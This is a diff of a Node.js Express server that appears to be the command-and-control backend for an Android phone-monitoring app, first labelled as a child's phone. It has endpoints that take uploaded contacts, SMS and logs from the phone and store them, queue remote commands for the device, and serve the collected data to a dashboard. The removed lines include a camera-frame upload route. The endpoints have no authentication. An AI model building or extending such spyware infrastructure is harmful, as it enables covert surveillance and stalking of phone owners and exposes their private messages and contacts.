@@ -7,12 +7,9 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// --- 1. SETTINGS ---
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
-
 if (!fs.existsSync(UPLOADS_DIR)) {
     fs.mkdirSync(UPLOADS_DIR);
-    console.log("📂 'uploads' folder created successfully.");
 }
 
 app.use(cors());
@@ -23,147 +20,89 @@ app.use(express.static(__dirname));
 let devices = {}; 
 
 // ==================================================
-// 📲 PHONE SIDE (Android App Yahan Baat Karega)
+// 📲 PHONE SIDE
 // ==================================================
 
-// 1. STATUS UPDATE & COMMAND CHECK
-// ✅ Corrected URL: '/api/status' (Android se match kiya)
 app.post('/api/status', (req, res) => {
-    
-    // Android App se data receive karo
     const { device_id, model, battery, version, charging } = req.body; 
-
-    const id = device_id || "Child_Phone_01";
+    const id = device_id || "M2103K19I";
 
     if (!devices[id]) devices[id] = {};
-    
-    const pendingCommand = devices[id].command || "none"; // Default 'none'
+    const pendingCommand = devices[id].command || "none";
 
-    // Update Status in RAM
     devices[id] = {
         model: model || "Unknown",
         battery: battery || 0,
         version: version || "--",
         charging: charging === 'true' || charging === true,
         lastSeen: Date.now(),
-        command: "" // Command bhej di, ab clear kar do
+        command: "" 
     };
 
-    console.log(`📡 Ping from ${id} | Bat: ${battery}% | Sent Cmd: ${pendingCommand}`);
-
-    // 🔥 FIX: Plain text nahi, JSON bhejo! (Android code JSON parsing kar raha hai)
-    res.json({ 
-        status: "success",
-        command: pendingCommand 
-    });
+    console.log(`📡 Ping from ${id} | Cmd: ${pendingCommand}`);
+    res.json({ status: "success", command: pendingCommand });
 });
 
-// 2. DATA UPLOAD (Contacts, SMS, Logs)
-// ✅ Corrected URL: '/api/upload_data' (Underscore use kiya)
 app.post('/api/upload_data', (req, res) => {
     const { device_id, type, data } = req.body;
-    const id = device_id || "Child_Phone_01";
+    const id = device_id || "M2103K19I";
 
-    console.log(`📥 Data Received from ${id}: [${type}]`);
+    console.log(`📥 Data Received: [${type}] from ${id}`);
 
-    let parsedData;
-    try {
-        parsedData = typeof data === 'string' ? JSON.parse(data) : data;
-    } catch (e) {
-        parsedData = data;
-    }
+    let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
 
+    // File Name: M2103K19I_contacts.json
     const fileName = `${id}_${type}.json`;
     const filePath = path.join(UPLOADS_DIR, fileName);
 
     try {
         fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
-        console.log(`✅ Saved to: ${fileName}`);
-        res.json({ status: "success" }); // Android ko JSON confirmation bhejo
+        res.json({ status: "success" });
     } catch (error) {
-        console.error("❌ Save Error:", error);
         res.status(500).json({ status: "error" });
     }
 });
 
-// 3. CAMERA FRAME UPLOAD
-// ✅ Corrected URL: '/api/upload_frame' (Underscore use kiya)
-app.post('/api/upload_frame', (req, res) => {
-    const { device_id, image_data } = req.body;
-    const id = device_id || "Child_Phone_01";
+// ==================================================
+// 💻 DASHBOARD SIDE (FIXED ROUTES)
+// ==================================================
 
-    if (!image_data) {
-        return res.status(400).send("No image data");
-    }
-
-    console.log(`📸 Image Received from ${id}`);
-
-    const fileName = `${id}_cam_${Date.now()}.jpg`;
+// 🔥 YE MISSING THA: Dashboard isi se data uthayega
+app.get('/api/get-data/:device_id/:type', (req, res) => {
+    const { device_id, type } = req.params;
+    // Naming pattern match karo: M2103K19I_contacts.json
+    const fileName = `${device_id}_${type}.json`;
     const filePath = path.join(UPLOADS_DIR, fileName);
 
-    // "data:image/jpeg;base64," hatao
-    const base64Image = image_data.replace(/^data:image\/\w+;base64,/, "");
+    console.log(`🔍 Dashboard is asking for: ${fileName}`);
 
-    fs.writeFile(filePath, base64Image, 'base64', (err) => {
-        if (err) {
-            console.error("❌ Image Save Error:", err);
-            return res.status(500).send("error");
-        }
-        console.log(`✅ Photo Saved: ${fileName}`);
-        res.json({ status: "success" });
-    });
-});
-
-
-// ==================================================
-// 💻 DASHBOARD SIDE (Website Logic)
-// ==================================================
-
-// Dashboard Status Check
-app.get('/api/device-status/:id', (req, res) => {
-    const id = req.params.id;
-    const device = devices[id];
-
-    if (!device) {
-        return res.json({ isOnline: false, message: "Waiting..." });
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        res.json([]); // File nahi hai to empty array bhejo
     }
-
-    const isOnline = (Date.now() - device.lastSeen) < 60000; // 60 sec timeout
-    
-    // Dashboard ko poora data bhejo
-    res.json({ 
-        ...device, 
-        isOnline,
-        lastSeenStr: new Date(device.lastSeen).toLocaleTimeString()
-    });
 });
 
-// Dashboard Command Sender
 app.post('/api/send-command', (req, res) => {
     const { device_id, command } = req.body;
-    
-    // Agar Dashboard se ID aayi to wahi use karo, warna default
     const id = device_id || "M2103K19I"; 
 
     if (!devices[id]) devices[id] = {};
     devices[id].command = command;
     
-    console.log(`🚀 Command Queued: [${command}] for ${id}`);
-    res.json({ status: "success", message: `Command '${command}' queued for ${id}` });
+    console.log(`🚀 Command [${command}] queued for ${id}`);
+    res.json({ status: "success" });
 });
 
-// Image Viewer
-app.get('/uploads/:filename', (req, res) => {
-    const filePath = path.join(UPLOADS_DIR, req.params.filename);
-    if (fs.existsSync(filePath)) {
-        res.sendFile(filePath);
-    } else {
-        res.status(404).send("File not found");
-    }
+app.get('/api/device-status/:id', (req, res) => {
+    const id = req.params.id;
+    const device = devices[id];
+    if (!device) return res.json({ isOnline: false });
+
+    const isOnline = (Date.now() - device.lastSeen) < 60000;
+    res.json({ ...device, isOnline });
 });
 
-// --- Server Start ---
 app.listen(PORT, () => {
-    console.log(`🔥 SERVER STARTED ON PORT ${PORT}`);
-    console.log(`👉 Waiting for Android connection on /api/status...`);
+    console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`);
 });
